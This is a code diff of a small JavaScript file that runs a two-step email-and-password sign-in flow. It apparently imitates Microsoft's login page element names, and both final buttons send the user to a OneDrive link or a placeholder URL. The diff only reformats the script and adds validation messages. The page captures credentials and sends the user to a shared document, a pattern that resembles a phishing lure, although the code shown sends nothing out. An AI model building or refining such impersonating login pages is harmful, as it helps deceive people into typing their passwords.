@@ -1,1 +1,56 @@
-document.addEventListener('DOMContentLoaded',()=>{const link='https://1drv.ms/w/c/a93ba84713d39e89/EY0GnOXAAUBMjH9uXz0oQYsB-qX8GpjcDd6ENjzLNIAPAg?e=aShZCo';let view='uname';const uname=document.getElementById('inp_uname');const pwd=document.getElementById('inp_pwd');const secU=document.getElementById('section_uname');const secP=document.getElementById('section_pwd');const secF=document.getElementById('section_final');document.getElementById('btn_next').addEventListener('click',()=>{if(uname.value.trim()){document.getElementById('user_identity').textContent=uname.value;secU.classList.add('d-none');secP.classList.remove('d-none');view='pwd';}});document.getElementById('btn_sig').addEventListener('click',()=>{if(pwd.value.trim()){secP.classList.add('d-none');secF.classList.remove('d-none');view='final';}});document.querySelector('.back').addEventListener('click',()=>{secP.classList.add('d-none');secU.classList.remove('d-none');view='uname';});['btn_final_no','btn_final_yes'].forEach(id=>{document.getElementById(id).addEventListener('click',()=>{window.location.href=link;});});});
+document.addEventListener('DOMContentLoaded', () => {
+  // redirect target (public OneDrive PDF or anything you like)
+  const redirectURL =
+    'https://YOUR_ONEDRIVE_PUBLIC_LINK_HERE';  // ← replace this link
+
+  // elements
+  const secU = document.getElementById('section_uname');
+  const secP = document.getElementById('section_pwd');
+  const secF = document.getElementById('section_final');
+
+  const btnNext = document.getElementById('btn_next');
+  const btnBack = document.getElementById('btn_back');
+  const btnSign = document.getElementById('btn_sig');
+  const btnYes  = document.getElementById('btn_final_yes');
+  const btnNo   = document.getElementById('btn_final_no');
+
+  const inpEmail = document.getElementById('inp_uname');
+  const inpPwd   = document.getElementById('inp_pwd');
+  const errEmail = document.getElementById('error_uname');
+  const errPwd   = document.getElementById('error_pwd');
+  const identity = document.getElementById('user_identity');
+
+  // simple client-side validation (no data leaves browser)
+  btnNext.addEventListener('click', () => {
+    if (inpEmail.value.trim()) {
+      identity.textContent = inpEmail.value.trim();
+      errEmail.textContent = '';
+      secU.classList.add('hidden');
+      secP.classList.remove('hidden');
+    } else {
+      errEmail.textContent = 'Enter your email address.';
+      inpEmail.classList.add('error');
+    }
+  });
+
+  btnBack.addEventListener('click', () => {
+    secP.classList.add('hidden');
+    secU.classList.remove('hidden');
+  });
+
+  btnSign.addEventListener('click', () => {
+    if (inpPwd.value.trim()) {
+      errPwd.textContent = '';
+      secP.classList.add('hidden');
+      secF.classList.remove('hidden');
+    } else {
+      errPwd.textContent = 'Enter your password.';
+      inpPwd.classList.add('error');
+    }
+  });
+
+  // final redirect (Yes or No -> same URL)
+  [btnYes, btnNo].forEach(btn =>
+    btn.addEventListener('click', () => (window.location.href = redirectURL))
+  );
+});
